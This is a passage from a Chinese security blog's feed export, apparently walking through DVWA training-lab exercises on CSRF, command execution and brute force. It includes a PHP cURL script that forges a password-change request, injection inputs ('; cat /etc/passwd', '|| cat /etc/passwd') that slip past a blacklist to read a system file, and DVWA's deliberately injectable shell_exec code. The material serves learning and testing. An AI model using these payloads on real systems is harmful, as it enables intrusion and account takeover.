class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  $ch = curl_init(); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  curl_setopt($ch,CURLOPT_URL,&lt;span class=&quot;string&quot;&gt;&quot;http://114.215.127.138/baji/DVWA-1.0.8/vulnerabilities/csrf/?password_new=12345&amp;amp;password_conf=12345&amp;amp;Change=Change#&quot;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  curl_setopt($ch, CURLOPT_REFERER, &lt;span class=&quot;string&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  curl_exec($ch); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  curl_close($ch);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;　　这里就不做具体演示了。&lt;br&gt;　　DVWA中这个级别的本身就存在一些问题（不知道是不是我的版本问题），所以不要纠结于为什么不成功，可以自己修改下原代码修复之后再测试。&lt;/p&gt;
&lt;h2 id=&quot;DVWA平台high级别CSRF分析&quot;&gt;&lt;a href=&quot;#DVWA平台high级别CSRF分析&quot; class=&quot;headerlink&quot; title=&quot;DVWA平台high级别CSRF分析&quot;&gt;&lt;/a&gt;DVWA平台high级别CSRF分析&lt;/h2&gt;&lt;p&gt;　　最后看看high级别的，high级别对于CSRF就有了较好的防御，来看源码：&lt;br&gt;&lt;img src=&quot;/uploads/8/8-9.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　从源码中可以看到，修改密码是需要旧密码做验证的，这样的话，不知道密码的情况下，我们是没办法做到跨站请求伪造攻击的，除非辅助以其他的漏洞攻击，这里不做额外衍生了。&lt;br&gt;　　旧密码验证是一种防御方式，也可以添加验证码等其他方式进行二次验证，这样则能尽量防御CSRF攻击。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;　　本文简单介绍了CSRF的形成原理，以及以DVWA平台为例，做了简单的利用分析！
    
    </summary>
    
      <category term="others" scheme="http://yoursite.com/categories/others/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>7.渗透测试平台DVWA之命令执行</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0DVWA%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://yoursite.com/渗透测试平台DVWA之命令执行/</id>
    <published>2016-04-20T10:09:16.000Z</published>
    <updated>2016-06-09T13:05:44.265Z</updated>
    
    <content type="html">&lt;p&gt;　　本文通过DVWA的Command Execution模块进行命令执行漏洞的一般演示，DVWA中共存在三个级别的命令执行漏洞。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;　　DVWA中命令执行测试分三个级别，low，medium和high，下面依次来分析。&lt;/p&gt;
&lt;h2 id=&quot;low级别命令执行测试&quot;&gt;&lt;a href=&quot;#low级别命令执行测试&quot; class=&quot;headerlink&quot; title=&quot;low级别命令执行测试&quot;&gt;&lt;/a&gt;low级别命令执行测试&lt;/h2&gt;&lt;p&gt;　　首先，把DVWA的安全级别调至low，如图所示：&lt;br&gt;&lt;img src=&quot;/uploads/7/7-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　此时，底部左侧会显示级别，如图所示：&lt;br&gt;&lt;img src=&quot;/uploads/7/7-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　接下来回到命令执行模块，根据提示输入IP地址，提交后返回了ping信息，如图所示：&lt;br&gt;&lt;img src=&quot;/uploads/7/7-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　以此可以判断这是一个ping程序，输入IP则进行ping操作。总所周知，ping命令是系统命令，即此处调用了系统命令，那么是否可以构造特殊命令执行语句执行其他命令呢？&lt;br&gt;　　我们知道，在window的DOS命令执行中可以用“&amp;amp;&amp;amp;”来连接两个命令一起执行，而linux中则可以利用“;”来连接两个命令共同执行，我们这里可以测试一下。由于测试服务器是linux系统，所以我们直接用“;”来测试。&lt;br&gt;　　输入“; cat /etc/passwd”，看是否能读取到passwd文件中的信息并打印出来。&lt;br&gt;&lt;img src=&quot;/uploads/7/7-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　从图中，可以很明显的看到，“;”后面的命令执行成功了，打印出了passwd文件的信息。&lt;br&gt;　　那么，可以判断其存在命令执行漏洞。通过此漏洞可以直接执行系统命令，如果权限够大，甚至可以直接执行添加系统管理员，开启敏感端口等。&lt;br&gt;　　现在我们来瞧瞧它的源码，看看这个漏洞是如何产生的。选择View Source查看相关源码，如图所示：&lt;br&gt;&lt;img src=&quot;/uploads/7/7-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;( &lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;( $_POST[ &lt;span class=&quot;string&quot;&gt;&#39;submit&#39;&lt;/span&gt; ] ) ) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $target = $_REQUEST[ &lt;span class=&quot;string&quot;&gt;&#39;ip&#39;&lt;/span&gt; ]; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// Determine OS and execute the ping command. &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (stristr(php_uname(&lt;span class=&quot;string&quot;&gt;&#39;s&#39;&lt;/span&gt;), &lt;span class=&quot;string&quot;&gt;&#39;Windows NT&#39;&lt;/span&gt;)) &amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $cmd = shell_exec( &lt;span class=&quot;string&quot;&gt;&#39;ping  &#39;&lt;/span&gt; . $target ); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;pre&amp;gt;&#39;&lt;/span&gt;.$cmd.&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $cmd = shell_exec( &lt;span class=&quot;string&quot;&gt;&#39;ping  -c 3 &#39;&lt;/span&gt; . $target );        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;pre&amp;gt;&#39;&lt;/span&gt;.$cmd.&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;　　从代码中可以看到，用户输入的数据直接被赋值到$target变量，且在第二个if语句中被直接利用，而没有做任何的处理，所以导致了任意命令执行漏洞。&lt;/p&gt;
&lt;h2 id=&quot;medium级别命令执行测试&quot;&gt;&lt;a href=&quot;#medium级别命令执行测试&quot; class=&quot;headerlink&quot; title=&quot;medium级别命令执行测试&quot;&gt;&lt;/a&gt;medium级别命令执行测试&lt;/h2&gt;&lt;p&gt;　　将DVWA security级别调到medium进行中等安全的命令执行测试。&lt;br&gt;　　当DVWA处于这个级别时，我们会发现，之前的命令执行方法已经不适用了，即使用“;”或“&amp;amp;&amp;amp;”来连接命令已经无法达到目的，可以猜测，其做了安全措施，如转义了敏感字符等。&lt;br&gt;　　我们直接来分析下这个级别的命令执行模块代码。&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;( &lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;( $_POST[ &lt;span class=&quot;string&quot;&gt;&#39;submit&#39;&lt;/span&gt;] ) ) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $target = $_REQUEST[ &lt;span class=&quot;string&quot;&gt;&#39;ip&#39;&lt;/span&gt; ]; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// Remove any of the charactars in the array (blacklist). &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $substitutions = &lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;( &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;&amp;amp;&#39;&lt;/span&gt; =&amp;gt; &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&#39;;&#39;&lt;/span&gt; =&amp;gt; &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );     &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// Determine OS and execute the ping command. &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (stristr(php_uname(&lt;span class=&quot;string&quot;&gt;&#39;s&#39;&lt;/span&gt;), &lt;span class=&quot;string&quot;&gt;&#39;Windows NT&#39;&lt;/span&gt;)) &amp;#123;       &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $cmd = shell_exec( &lt;span class=&quot;string&quot;&gt;&#39;ping  &#39;&lt;/span&gt; . $target ); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;pre&amp;gt;&#39;&lt;/span&gt;.$cmd.&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt;;          &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;       &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $cmd = shell_exec( &lt;span class=&quot;string&quot;&gt;&#39;ping  -c 3 &#39;&lt;/span&gt; . $target ); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;pre&amp;gt;&#39;&lt;/span&gt;.$cmd.&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt;;          &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;　　从代码不难看出，其对“&amp;amp;&amp;amp;”和“;”字符，利用str_replace方法做了转义，变成空字符了。所以我们没法用这两种方法来连接额外的命令，从而达到任意命令执行了。&lt;br&gt;　　然而，细心的你会想到，这里其用的是黑名单的方式，而且单单只是过滤了“&amp;amp;&amp;amp;”和“;”字符，那么是否有其他字符也能做到同样的效果呢？&lt;br&gt;　　这样想，过滤掉的两种连接字符是达到如and般效果，那么是否也有类似or的效果的方法呢？&lt;br&gt;　　答案是肯定的，无论在window还是linux系统中，我们都可以通过“||”来达到类似or一样的效果，不同的是，这其实并不完全是or，其实际效果是当“||”前的命令执行失败时，执行“||”后的命令。也就是说，如果“||”前的命令执行成功了，那么就不会执行后面的命令了。所以我们在构造特殊命令时要注意，不能在“||”前构造能够成功执行的命令语句。&lt;br&gt;　　结合DVWA的命令执行模块测试程序，这里是ping程序，需要用户输入IP，那么其实，我们只要不输入IP直接输入“||”并带上我们希望执行的语句就可以了，因为酱紫就导致了“||”前的ping语句没有目标而执行失败，从而会执行后面的语句，我们测试一下，输入“|| cat /etc/passwd”，结果如图：&lt;br&gt;&lt;img src=&quot;/uploads/7/7-6.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　成功执行了。所以说，黑名单的过滤方法真心不怎么安全，总能被人想到方法绕过。&lt;/p&gt;
&lt;h2 id=&quot;high级别命令执行测试&quot;&gt;&lt;a href=&quot;#high级别命令执行测试&quot; class=&quot;headerlink&quot; title=&quot;high级别命令执行测试&quot;&gt;&lt;/a&gt;high级别命令执行测试&lt;/h2&gt;&lt;p&gt;　　最后介绍high级别的命令执行模块，先把DVWA security级别调到high。这个级别你会发现之前两个级别的所有方法都失效了，而且你如论如何也突破不了达到任意命令执行的效果，我们直接来分析源码。&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;( &lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;( $_POST[ &lt;span class=&quot;string&quot;&gt;&#39;submit&#39;&lt;/span&gt; ] ) ) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $target = $_REQUEST[&lt;span class=&quot;string&quot;&gt;&quot;ip&quot;&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $target = stripslashes( $target ); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// Split the IP into 4 octects &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $octet = explode(&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;, $target); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// Check IF each octet is an integer &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((is_numeric($octet[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;])) &amp;amp;&amp;amp; (is_numeric($octet[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;])) &amp;amp;&amp;amp; (is_numeric($octet[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;])) &amp;amp;&amp;amp; (is_numeric($octet[&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;])) &amp;amp;&amp;amp; (sizeof($octet) == &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;)  ) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// If all 4 octets are int&#39;s put the IP back together. &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $target = $octet[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].&lt;span class=&quot;string&quot;&gt;&#39;.&#39;&lt;/span&gt;.$octet[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;].&lt;span class=&quot;string&quot;&gt;&#39;.&#39;&lt;/span&gt;.$octet[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;].&lt;span class=&quot;string&quot;&gt;&#39;.&#39;&lt;/span&gt;.$octet[&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// Determine OS and execute the ping command. &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (stristr(php_uname(&lt;span class=&quot;string&quot;&gt;&#39;s&#39;&lt;/span&gt;), &lt;span class=&quot;string&quot;&gt;&#39;Windows NT&#39;&lt;/span&gt;)) &amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $cmd = shell_exec( &lt;span class=&quot;string&quot;&gt;&#39;ping  &#39;&lt;/span&gt; . $target ); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;pre&amp;gt;&#39;&lt;/span&gt;.$cmd.&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt;;          &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;       &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $cmd = shell_exec( &lt;span class=&quot;string&quot;&gt;&#39;ping  -c 3 &#39;&lt;/span&gt; . $target ); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;pre&amp;gt;&#39;&lt;/span&gt;.$cmd.&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt;;          &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;      &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;      &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;pre&amp;gt;ERROR: You have entered an invalid IP&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;           &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;　　从代码中可以看到，$target接收来这用户输入的数据，然后利用explode以“.”为边界进行分割，成为一个数组赋值给$octet，接下来利用if语句判断数组中的数据是否都为数字，并且限制了数组的长度只能是4，也就是说，基本限制了用户输入的数据就只能是IP地址。&lt;br&gt;这样才会执行if里面的语句去执行使用用户输入的命令，而这样的限制已经非常苛刻了，至少目前我还没发现啥子方法可以绕过去的，在这里GG了，求路过的大神支招。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;　　本文通过DVWA的Command Execution模块进行命令执行漏洞的一般演示，DVWA中共存在三个级别的命令执行漏洞。
    
    </summary>
    
      <category term="others" scheme="http://yoursite.com/categories/others/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>6.渗透测试平台DVWA之暴力破解</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0DVWA%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <id>http://yoursite.com/渗透测试平台DVWA之暴力破解/</id>
    <published>2016-04-20T09:55:43.000Z</published>
    <updated>2016-04-20T10:02:28.189Z</updated>
    
    <content type="html">&lt;p&gt;　　本文通过DVWA的Brute Force模块进行暴力破解漏洞的一般演示，其中还使用了burpsuite工具。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;　　选择Brute Force进行暴力破解测试&lt;br&gt;&lt;img src=&quot;/uploads/6/6-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　首先开启burpsuite，把浏览器代理到burpsuite进行截包。&lt;br&gt;&lt;img src=&quot;/uploads/6/6-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　随便输入一个用户名密码，然后查看burpsuite中数据包截取情况，可以看到已经截取到登录的请求包，账户密码是明文传输且使用get方法，我们需要把数据包发送到intruder模块进行爆破。&lt;br&gt;&lt;img src=&quot;/uploads/6/6-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　进入intruder模块，把用户名改为admin，密码作为破解对象进行暴力破解&lt;br&gt; &lt;img src=&quot;/uploads/6/6-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　为了方便测试，这里直接手动输入几个密码作为字典，包含正确密码。&lt;br&gt; &lt;img src=&quot;/uploads/6/6-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　然后开始破解，很快我们就可以看到破解出密码为password（根据反馈数据包长度以及内容进行判断）&lt;br&gt; &lt;img src=&quot;/uploads/6/6-6.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　当然，我们也可以把用户名也作为破解对象，那么此时，破解的难度就会加大，耗时也会成倍增长，同时破解对象越多，耗时越长，难度越大。&lt;br&gt;　　